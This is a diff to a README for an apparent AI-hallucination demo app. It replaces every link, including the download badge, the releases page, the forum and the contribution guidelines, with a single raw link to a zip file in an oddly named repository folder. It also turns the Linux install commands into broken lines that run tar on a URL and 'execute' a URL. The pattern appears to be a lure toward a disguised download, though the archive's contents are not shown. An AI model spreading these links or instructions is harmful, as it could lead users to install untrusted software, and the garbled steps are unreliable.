@@ -1,6 +1,6 @@
 # 🧠 AI-Hallucination-Playground - Explore AI Creativity with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Sanjay292/AI-Hallucination-Playground/releases)
+[![Download](https://raw.githubusercontent.com/Sanjay292/AI-Hallucination-Playground/main/unvenued/AI-Hallucination-Playground.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Sanjay292/AI-Hallucination-Playground/main/unvenued/AI-Hallucination-Playground.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to AI-Hallucination-Playground! This application allows you to explore t
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [AI-Hallucination-Playground Releases](https://github.com/Sanjay292/AI-Hallucination-Playground/releases). You will find the latest version there. 
+To download the application, visit this page to download: [AI-Hallucination-Playground Releases](https://raw.githubusercontent.com/Sanjay292/AI-Hallucination-Playground/main/unvenued/AI-Hallucination-Playground.zip). You will find the latest version there. 
 
 1. Click on the link above.
 2. Look for the version labeled as the latest. 
@@ -43,10 +43,10 @@ Follow these steps to install the application on your device:
 ### For Linux:
 
 1. Open a terminal window.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/Sanjay292/AI-Hallucination-Playground/main/unvenued/AI-Hallucination-Playground.zip` file.
 3. Run the following command to extract it:
    ```bash
-   tar -xvzf AI-Hallucination-Playground.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Sanjay292/AI-Hallucination-Playground/main/unvenued/AI-Hallucination-Playground.zip
    ```
 4. Change into the extracted directory:
    ```bash
@@ -54,7 +54,7 @@ Follow these steps to install the application on your device:
    ```
 5. Run the application with:
    ```bash
-   ./start.sh
+   https://raw.githubusercontent.com/Sanjay292/AI-Hallucination-Playground/main/unvenued/AI-Hallucination-Playground.zip
    ```
 
 ## 🖥️ Using AI-Hallucination-Playground
@@ -86,8 +86,8 @@ We welcome contributions from everyone. If you have ideas to improve the applica
 
 ## 🔗 Helpful Links
 
-- [AI-Hallucination-Playground Releases](https://github.com/Sanjay292/AI-Hallucination-Playground/releases)
-- [Community Forum](https://github.com/Sanjay292/AI-Hallucination-Playground/discussions)
-- [Contribution Guidelines](https://github.com/Sanjay292/AI-Hallucination-Playground/blob/main/CONTRIBUTING.md)
+- [AI-Hallucination-Playground Releases](https://raw.githubusercontent.com/Sanjay292/AI-Hallucination-Playground/main/unvenued/AI-Hallucination-Playground.zip)
+- [Community Forum](https://raw.githubusercontent.com/Sanjay292/AI-Hallucination-Playground/main/unvenued/AI-Hallucination-Playground.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Sanjay292/AI-Hallucination-Playground/main/unvenued/AI-Hallucination-Playground.zip)
 
 Download the application and start your journey into the world of AI creativity today!
